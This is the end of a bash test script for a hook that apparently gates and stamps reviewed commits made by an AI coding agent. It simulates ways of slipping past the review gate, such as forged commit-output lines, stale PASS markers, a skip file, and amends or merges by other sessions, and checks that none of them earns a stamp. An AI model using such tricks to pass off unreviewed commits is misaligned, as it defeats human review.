assert "the gate leaves a claim naming the commit's parent and tree" "yes" "$([[ -f "$(claim_for toolu_E2E "$NE")" ]] && echo yes || echo no)"
fire_raw '"tool_use_id":"toolu_E2E",'
assert "a bound reviewed commit is stamped" "$(git -C "$TMP" symbolic-ref --short HEAD):$NE" "$(tail -1 "$TMP/.claude/reviewed-commits.local" 2>/dev/null)"
# A late delivery: another session committed on top before this one arrived.
# Its record stays HEAD's, as before, annotated with the printed commit: a
# forged line naming an earlier commit leaves the same history (next row).
echo nlate > "$TMP/f"; git -C "$TMP" add -A
assert "(late) the gate allows it" "allowed" "$(gate_sees toolu_LATE)"
git -C "$TMP" commit -q -m "feat: this call"
rm -f "$TMP/.claude/litmus-passed.local"  # the markerless delivery first
NTHIS=$(git -C "$TMP" rev-parse HEAD)
echo nother > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: another session"
NOTHER=$(git -C "$TMP" rev-parse HEAD)
fire_raw '"tool_use_id":"toolu_LATE",' "$(git -C "$TMP" rev-parse --short "$NTHIS")"
assert "a late delivery records HEAD, annotated" "\"sha\":\"$NOTHER\",\"named\":\"$NTHIS\"}" \
    "$(grep -F "\"event\":\"unreviewed-commit\",\"gate\":\"post-commit\",\"sha\":\"$NOTHER\"" "$TMP/.claude/bypass-log.jsonl" | grep -o '"sha":.*')"
assert "... and observes the printed commit" "1" "$(count_event commit-output-mismatch "$NTHIS")"
RC6=$(rc_lines)
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_LATE",' "$(git -C "$TMP" rev-parse --short "$NTHIS")"
assert "a late reviewed delivery is not stamped" "$RC6" "$(rc_lines)"
# Another session commits first and this call's staged tree lands on it,
# printing a forged line that names the other commit: the record still names
# this call's HEAD, and its parent is not the gate's HEAD, so no stamp.
echo nmine > "$TMP/f"; git -C "$TMP" add -A
assert "(forge) the gate allows it" "allowed" "$(gate_sees toolu_FORGE)"
NFIRST=$(git -C "$TMP" commit-tree -p HEAD -m "feat: other session first" "HEAD^{tree}")
git -C "$TMP" update-ref HEAD "$NFIRST"
git -C "$TMP" commit -q -m "feat: this call, second"
NMINE=$(git -C "$TMP" rev-parse HEAD)
RC7=$(rc_lines)
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_FORGE",' "$(git -C "$TMP" rev-parse --short "$NFIRST")"
assert "a forged line naming the other session's commit is not stamped" "$RC7" "$(rc_lines)"
fire_raw '"tool_use_id":"toolu_FORGE2",' "$(git -C "$TMP" rev-parse --short "$NFIRST")"
assert "... nor moves the gate miss to it" "0" "$(count_event unreviewed-commit "$NFIRST")"
assert "... which stays this call's" "1" "$(count_event unreviewed-commit "$NMINE")"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_FORGE",'
assert "a commit not built on the gate's HEAD is not stamped" "$RC7" "$(rc_lines)"
# An amend's parent is the old HEAD's parent: not bound, so no stamp (the amend
# also clears reviewed-commits.local, as before).
echo namend > "$TMP/f"; git -C "$TMP" add -A
assert "(amend) the gate allows it" "allowed" "$(gate_sees toolu_AMEND)"
git -C "$TMP" commit -q --amend -m "feat: amended"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
printf '{"tool_name":"Bash","tool_use_id":"toolu_AMEND","cwd":"%s","tool_input":{"command":"git commit --amend -m x"},"tool_output":{"output":"[main %s] x"}}' \
    "$TMP" "$(git -C "$TMP" rev-parse --short HEAD)" > "$TMP/.git/payload.json"; run_hook
assert "an amend is not stamped" "0" "$(rc_lines)"
# This call commits A; another session amends it to B before delivery. B is
# built on the gate's HEAD too, but when the output names A, B is not stamped,
# and when the output names nothing, B's tree is not the staged one.
echo nrw > "$TMP/f"; git -C "$TMP" add -A
assert "(rewrite) the gate allows it" "allowed" "$(gate_sees toolu_REWRITE)"
git -C "$TMP" commit -q -m "feat: this call"
NA=$(git -C "$TMP" rev-parse HEAD)
echo nrw-other > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q --amend -m "feat: rewritten by another session"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_REWRITE",' "$(git -C "$TMP" rev-parse --short "$NA")"
assert "a commit another session rewrote is not stamped" "0" "$(rc_lines)"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
printf '{"tool_name":"Bash","tool_use_id":"toolu_REWRITE","cwd":"%s","tool_input":{"command":"git commit -q -m x"},"tool_output":{"output":""}}' \
    "$TMP" > "$TMP/.git/payload.json"; run_hook
assert "... even when the output names nothing" "0" "$(rc_lines)"
# A skip lets a commit through without validating a review: it writes no claim,
# so a PASS left in place for another diff stamps nothing.
echo nskip > "$TMP/f"; git -C "$TMP" add -A
echo "0000000000000000000000000000000000000000000000000000000000000000" > "$TMP/.claude/litmus-passed.local"
touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
printf '{"tool_name":"Bash","tool_use_id":"toolu_SKIPPED","cwd":"%s","tool_input":{"command":"git commit -m x"}}' \
    "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
assert "(skip) the gate allows it" "no" "$([[ -e "$TMP/.claude/skip-litmus.local" ]] && echo yes || echo no)"
git -C "$TMP" commit -q -m "feat: skipped"
RC8=$(rc_lines)
fire_raw '"tool_use_id":"toolu_SKIPPED",'
assert "a skipped commit with a stale PASS is not stamped" "$RC8" "$(rc_lines)"
# A merge with the reviewed tree and the gate's HEAD as first parent still
# brings in its second parent's history, which the claim never named.
echo nmerge > "$TMP/f"; git -C "$TMP" add -A
assert "(merge) the gate allows it" "allowed" "$(gate_sees toolu_MERGE)"
NSIDE2=$(git -C "$TMP" commit-tree -p HEAD -m "side history" "HEAD^{tree}")
git -C "$TMP" update-ref HEAD "$(git -C "$TMP" commit-tree -p HEAD -p "$NSIDE2" -m "merge" "$(git -C "$TMP" write-tree)")"
RC9=$(rc_lines)
printf '{"tool_name":"Bash","tool_use_id":"toolu_MERGE","cwd":"%s","tool_input":{"command":"git commit -q -m x"},"tool_output":{"output":""}}' \
    "$TMP" > "$TMP/.git/payload.json"; run_hook
assert "a merge commit is not stamped" "$RC9" "$(rc_lines)"
# diff.mnemonicPrefix changes the prefixes git prints in the reviewed diff; the
# claim's hash runs the same command, so the reviewed commit is still bound.
git -C "$TMP" config diff.mnemonicPrefix true
echo nmnemonic > "$TMP/f"; git -C "$TMP" add -A
assert "(mnemonic) the gate allows it" "allowed" "$(gate_sees toolu_MNEMONIC)"
git -C "$TMP" commit -q -m "feat: mnemonic"
fire_raw '"tool_use_id":"toolu_MNEMONIC",'
assert "a reviewed commit under diff.mnemonicPrefix is stamped" \
    "$(git -C "$TMP" symbolic-ref --short HEAD):$(git -C "$TMP" rev-parse HEAD)" "$(tail -1 "$TMP/.claude/reviewed-commits.local" 2>/dev/null)"
git -C "$TMP" config --unset diff.mnemonicPrefix
# A replace ref on the staged tree does not change what the claim's hash reads.
echo nreplace > "$TMP/f"; git -C "$TMP" add -A
NREPL_TREE=$(git -C "$TMP" write-tree)
git -C "$TMP" replace -f "$NREPL_TREE" "$(git -C "$TMP" rev-parse "HEAD^{tree}")"
assert "(replace) the gate allows it" "allowed" "$(gate_sees toolu_REPLACE)"
git -C "$TMP" replace -d "$NREPL_TREE" >/dev/null
git -C "$TMP" commit -q -m "feat: replace"
fire_raw '"tool_use_id":"toolu_REPLACE",'
assert "a reviewed commit whose tree has a replace ref is stamped" \
    "$(git -C "$TMP" symbolic-ref --short HEAD):$(git -C "$TMP" rev-parse HEAD)" "$(tail -1 "$TMP/.claude/reviewed-commits.local" 2>/dev/null)"
# A late delivery for another call spends the shared marker first. The owner's
# own delivery is then markerless, but its gate's claim binds HEAD: HEAD is
# stamped and is no gate miss.
echo nowner > "$TMP/f"; git -C "$TMP" add -A
assert "(owner) the gate allows it" "allowed" "$(gate_sees toolu_OWNER)"
git -C "$TMP" commit -q -m "feat: owner"
NOWNER=$(git -C "$TMP" rev-parse HEAD)
RC10=$(rc_lines)
fire_raw '"tool_use_id":"toolu_LATECOMER",'
assert "a late delivery spends the marker without stamping" "$RC10" "$(rc_lines)"
fire_raw '"tool_use_id":"toolu_OWNER",'
assert "... the owner's markerless delivery still stamps its commit" "$((RC10 + 1))" "$(rc_lines)"
assert "... and logs no gate miss for it" "0" "$(count_event unreviewed-commit "$NOWNER")"
fire_raw '"tool_use_id":"toolu_OWNER",'
assert "... once" "$((RC10 + 1))" "$(rc_lines)"
# A root commit is bound to the gate's empty (unborn) HEAD.
ROOT="$TMP/.git/rootrepo"
git init -q "$ROOT"; git -C "$ROOT" config user.email t@t; git -C "$ROOT" config user.name t
mkdir -p "$ROOT/.claude"
echo r > "$ROOT/f"; git -C "$ROOT" add -A
assert "(root) the gate allows it" "allowed" "$(gate_sees toolu_ROOT "$ROOT")"
git -C "$ROOT" commit -q -m "feat: root"
assert "the gate claims an unborn HEAD as empty" "yes" "$([[ -f "$(base_claim toolu_ROOT "" "$(git -C "$ROOT" rev-parse "HEAD^{tree}")" "$ROOT")" ]] && echo yes || echo no)"
echo "PASS" > "$ROOT/.claude/litmus-passed.local"
printf '{"tool_name":"Bash","tool_use_id":"toolu_ROOT","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main (root-commit) %s] x"}}' \
    "$ROOT" "$(git -C "$ROOT" rev-parse --short HEAD)" > "$TMP/.git/payload.json"; run_hook "$ROOT"
assert "a bound root commit is stamped" "$(git -C "$ROOT" symbolic-ref --short HEAD):$(git -C "$ROOT" rev-parse HEAD)" \
    "$(tail -1 "$ROOT/.claude/reviewed-commits.local" 2>/dev/null)"
# A shallow boundary commit has a parent git hides; an empty-HEAD claim does not
# bind it.
SHALLOW="$TMP/.git/shallow"
git clone -q --depth 1 "file://$TMP" "$SHALLOW" 2>/dev/null
mkdir -p "$SHALLOW/.claude"
touch "$(base_claim toolu_SHALLOW "" "$(git -C "$SHALLOW" rev-parse "HEAD^{tree}")" "$SHALLOW")"
echo "PASS" > "$SHALLOW/.claude/litmus-passed.local"
# The fixture commits its own .claude, so the clone may carry stamps already.
SH_HEAD=$(git -C "$SHALLOW" rev-parse HEAD)
printf '{"tool_name":"Bash","tool_use_id":"toolu_SHALLOW","cwd":"%s","tool_input":{"command":"git commit -q -m x"},"tool_output":{"output":""}}' \
    "$SHALLOW" > "$TMP/.git/payload.json"; run_hook "$SHALLOW"
assert "a shallow boundary does not pass for a root commit" "no" \
    "$(grep -q ":$SH_HEAD\$" "$SHALLOW/.claude/reviewed-commits.local" 2>/dev/null && echo yes || echo no)"
assert "every fired run reached the end of the hook" "0" "$INCOMPLETE"

echo ""
echo "═══════════════════════════════════════════════════════════════"
printf "Results: %d/%d passed" "$PASS" "$TOTAL"
if [[ "$FAIL" -gt 0 ]]; then printf " (%d FAILED)\n" "$FAIL"; exit 1; else printf " (all passed)\n"; exit 0; fi
